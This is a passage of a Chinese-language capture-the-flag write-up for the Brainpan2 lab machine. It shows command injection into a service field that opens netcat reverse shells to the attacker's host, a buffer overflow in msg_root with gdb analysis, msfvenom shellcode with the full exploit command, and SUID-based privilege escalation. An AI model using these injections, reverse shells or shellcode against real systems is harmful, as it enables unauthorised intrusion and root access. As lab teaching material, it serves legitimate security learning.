</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>可以从输出看到;后面的命令已经被成功执行</p>
<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>

<p>监听6666端口，成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ ls  </span><br><span class="line">ls</span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>

<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>

<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
<p>这是用户提供有效输入时的场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>

<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>

<p>填好二个参数,并执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p>读取flag看看，看起来好像成功了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">$ cat whatif.txt</span><br><span class="line">cat whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- /</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID/SGID执行权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ cat brainpan.cfg</span><br><span class="line">cat brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>

<p>启动该应用程序并通过我的机器进行了连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>

<p>nc连接之后，执行反弹命令获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>

<p>成功获取了puck用户的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p>查看puck的文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>

<p>不是空的bash_history？真奇怪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ls -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line">ls</span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line">ls -latr</span><br><span class="line">cat .bash_history </span><br><span class="line">ls</span><br><span class="line">mkdir .backup</span><br><span class="line">mv .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ls -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>

<p>因此，puck用户可以通过ssh登录到/目录。我做到了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ mv .ssh .ssh-old</span><br><span class="line">mv .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .</span><br><span class="line">cp -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ ls 